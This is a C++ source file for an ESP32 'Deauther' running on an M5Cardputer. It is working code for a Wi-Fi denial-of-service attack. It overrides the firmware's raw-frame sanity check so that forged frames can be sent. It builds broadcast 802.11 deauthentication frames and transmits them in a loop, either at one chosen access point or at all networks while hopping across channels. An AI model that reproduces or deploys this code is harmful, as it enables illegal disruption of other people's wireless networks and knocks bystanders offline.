#include "ESP32Deauther.h"
#include "definitions.h"
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}
ESP32Deauther* ESP32Deauther::instance = nullptr;

ESP32Deauther::ESP32Deauther() : 
    deauthRunning(false), 
    deauthType(DEAUTH_TYPE_SINGLE), 
    currentChannel(1), 
    packetCount(0), 
    key9PressedLast(false),
    lastDeauthTime(0),
    lastError("") {
    instance = this;
    deauthFrame.frame_ctrl[0] = 0xC0; // Deauth frame
    deauthFrame.frame_ctrl[1] = 0x00;
    deauthFrame.duration[0] = 0x00;
    deauthFrame.duration[1] = 0x00;
    deauthFrame.seq_ctrl[0] = 0x00;
    deauthFrame.seq_ctrl[1] = 0x00;
}

bool ESP32Deauther::begin() {
    DEBUG_PRINTLN("Initializing ESP32Deauther...");
    lastError = "";
    // Add delay to ensure Wi-Fi hardware is ready
    delay(100);
    DEBUG_PRINTLN("Wi-Fi hardware delay completed");
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_err_t err = esp_wifi_init(&cfg);
    if (err != ESP_OK) {
        lastError = String("WiFi init error: ") + err + " (0x" + String(err, HEX) + ")";
        DEBUG_PRINTF("WiFi init error: %d (0x%04X)\n", err, err);
        return false;
    }
    DEBUG_PRINTLN("WiFi initialized successfully");
    err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
    if (err != ESP_OK) {
        lastError = String("WiFi storage error: ") + err + " (0x" + String(err, HEX) + ")";
        DEBUG_PRINTF("WiFi storage error: %d (0x%04X)\n", err, err);
        return false;
    }
    DEBUG_PRINTLN("WiFi storage set successfully");
    err = esp_wifi_set_mode(WIFI_MODE_AP);
    if (err != ESP_OK) {
        lastError = String("WiFi mode error: ") + err + " (0x" + String(err, HEX) + ")";
        DEBUG_PRINTF("WiFi mode error: %d (0x%04X)\n", err, err);
        return false;
    }
    DEBUG_PRINTLN("WiFi mode set to AP successfully");
    err = esp_wifi_start();
    if (err != ESP_OK) {
        lastError = String("WiFi start error: ") + err + " (0x" + String(err, HEX) + ")";
        DEBUG_PRINTF("WiFi start error: %d (0x%04X)\n", err, err);
        return false;
    }
    DEBUG_PRINTLN("WiFi started successfully");
    DEBUG_PRINTLN("ESP32Deauther initialized successfully");
    return true;
}

bool ESP32Deauther::checkInterface(wifi_interface_t ifx) {
    wifi_mode_t mode;
    esp_err_t err = esp_wifi_get_mode(&mode);
    if (err != ESP_OK) {
        lastError = String("Failed to get WiFi mode: ") + err + " (0x" + String(err, HEX) + ")";
        DEBUG_PRINTF("Failed to get WiFi mode: %d (0x%04X)\n", err, err);
        return false;
    }
    if (mode != WIFI_MODE_AP) {
        lastError = String("WiFi mode is not AP: ") + mode;
        DEBUG_PRINTF("WiFi mode is not AP: %d\n", mode);
        return false;
    }
    uint8_t mac[6];
    err = esp_wifi_get_mac(ifx, mac);
    if (err != ESP_OK) {
        lastError = String("Failed to get MAC: ") + err + " (0x" + String(err, HEX) + ")";
        DEBUG_PRINTF("Failed to get MAC: %d (0x%04X)\n", err, err);
        return false;
    }
    DEBUG_PRINTF("Interface %d is valid for mode %d, MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", 
                 ifx, mode, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return true;
}

bool ESP32Deauther::parseMacAddress(const String& macStr, uint8_t* mac) {
    String cleanMac = macStr;
    cleanMac.replace("-", ":");
    cleanMac.toUpperCase();
    if (cleanMac.length() != 17) {
        lastError = String("Invalid MAC format: ") + cleanMac;
        DEBUG_PRINTF("Invalid MAC format: %s (length=%d)\n", cleanMac.c_str(), cleanMac.length());
        return false;
    }
    for (int i = 0; i < 6; i++) {
        String byteStr = cleanMac.substring(i * 3, i * 3 + 2);
        if (!byteStr.isEmpty()) {
            mac[i] = strtol(byteStr.c_str(), NULL, 16);
        } else {
            lastError = String("Invalid MAC byte at position: ") + i;
            DEBUG_PRINTF("Invalid MAC byte at position: %d\n", i);
            return false;
        }
    }
    DEBUG_PRINTF("Parsed MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", 
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return true;
}

void ESP32Deauther::fillDeauthFrame(uint8_t* dest, uint8_t* src, uint8_t* bssid, uint16_t reason) {
    uint8_t deauth_frame[] = {
        0xC0, 0x00, // Frame Control: Deauth
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (broadcast)
        dest[0], dest[1], dest[2], dest[3], dest[4], dest[5], // Sender (BSSID)
        dest[0], dest[1], dest[2], dest[3], dest[4], dest[5], // BSSID
        0x00, 0x00, // Sequence Control
        reason & 0xFF, (reason >> 8) & 0xFF // Reason code
    };
    memcpy(&deauthFrame, deauth_frame, sizeof(deauth_frame));
    DEBUG_PRINT("Deauth frame: ");
    for (int i = 0; i < sizeof(deauthFrame); i++) {
        DEBUG_PRINTF("%02X ", ((uint8_t*)&deauthFrame)[i]);
    }
    DEBUG_PRINTLN("");
}

bool ESP32Deauther::sendDeauthFrames(wifi_interface_t ifx, int count) {
    if (!checkInterface(ifx)) {
        return false;
    }
    DEBUG_PRINTF("Sending %d deauth frames on interface %d\n", count, ifx);
    bool success = true;
    for (size_t i = 0; i < count; i++) {
        esp_err_t err = esp_wifi_80211_tx(ifx, &deauthFrame, sizeof(deauthFrame), false);
        if (err != ESP_OK) {
            lastError = String("Deauth frame ") + (i + 1) + " send error: " + err + " (0x" + String(err, HEX) + ")";
            DEBUG_PRINTF("Deauth frame %d send error: %d (0x%04X)\n", i + 1, err, err);
            success = false;
        } else {
            packetCount++;
            DEBUG_PRINTF("Sent deauth frame %d, total packets: %u\n", i + 1, packetCount);
        }
        delay(10);
    }
    return success;
}

bool ESP32Deauther::setChannel(int channel) {
    if (channel < 1 || channel > CHANNEL_MAX) {
        lastError = String("Invalid channel: ") + channel;
        DEBUG_PRINTF("Invalid channel: %d\n", channel);
        return false;
    }
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        lastError = String("Channel ") + channel + " set error: " + err + " (0x" + String(err, HEX) + ")";
        DEBUG_PRINTF("Channel %d set error: %d (0x%04X)\n", channel, err, err);
        return false;
    }
    currentChannel = channel;
    DEBUG_PRINTF("Channel set: %d\n", channel);
    return true;
}

bool ESP32Deauther::startDeauthNetwork(const String& bssid, int channel, uint16_t reason) {
    DEBUG_PRINTF("Starting Deauth-Attack: BSSID=%s, Channel=%d, Reason=%d\n", bssid.c_str(), channel, reason);
    lastError = "";
    if (!setChannel(channel)) {
        return false;
    }

    uint8_t bssidBytes[6];
    if (!parseMacAddress(bssid, bssidBytes)) {
        return false;
    }

    targetBSSID = bssid;
    deauthType = DEAUTH_TYPE_SINGLE;
    packetCount = 0;
    lastDeauthTime = 0;
    deauthFrame.reason[0] = reason & 0xFF;
    deauthFrame.reason[1] = (reason >> 8) & 0xFF;

    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    fillDeauthFrame(bssidBytes, bssidBytes, broadcastMac, reason);

    deauthRunning = true;
    DEBUG_PRINTLN("Deauth attack started");
    return true;
}

bool ESP32Deauther::startDeauthAll(uint16_t reason) {
    DEBUG_PRINTF("Starting Deauth-Attack on all networks: Reason=%d\n", reason);
    lastError = "";
    deauthType = DEAUTH_TYPE_ALL;
    packetCount = 0;
    currentChannel = 1;
    lastDeauthTime = 0;
    targetBSSID = "ALL";
    deauthFrame.reason[0] = reason & 0xFF;
    deauthFrame.reason[1] = (reason >> 8) & 0xFF;

    setChannel(currentChannel);
    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    fillDeauthFrame(broadcastMac, broadcastMac, broadcastMac, reason);

    deauthRunning = true;
    DEBUG_PRINTLN("Deauth all attack started");
    return true;
}

void ESP32Deauther::stopDeauth() {
    DEBUG_PRINTLN("Stopping Deauth-Attack...");
    lastError = "";
    esp_wifi_stop();
    deauthRunning = false;
    packetCount = 0;
}

void ESP32Deauther::handleDeauth() {
    if (!deauthRunning) return;

    if (millis() - lastDeauthTime > 500) {
        if (deauthType == DEAUTH_TYPE_SINGLE) {
            DEBUG_PRINTLN("Sending deauth frames for single BSSID");
            if (!sendDeauthFrames(WIFI_IF_AP, NUM_FRAMES_PER_DEAUTH)) {
                DEBUG_PRINTLN("Failed to send deauth frames");
            }
        } else {
            DEBUG_PRINTLN("Sending deauth frames for all networks");
            if (!sendDeauthFrames(WIFI_IF_AP, NUM_FRAMES_PER_DEAUTH)) {
                DEBUG_PRINTLN("Failed to send deauth frames");
            }
            if (currentChannel > CHANNEL_MAX) currentChannel = 1;
            setChannel(currentChannel);
            currentChannel++;
        }
        lastDeauthTime = millis();
    }

    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
        if (M5Cardputer.Keyboard.isKeyPressed('9')) {
            if (!key9PressedLast) {
                DEBUG_PRINTLN("Key 9 pressed, stopping deauth");
                stopDeauth();
                key9PressedLast = true;
            }
        } else {
            key9PressedLast = false;
        }
        M5Cardputer.Keyboard.keysState().reset();
    }
}

bool ESP32Deauther::deauthNetwork(const String& bssid, int channel, uint16_t reason) {
    return startDeauthNetwork(bssid, channel, reason);
}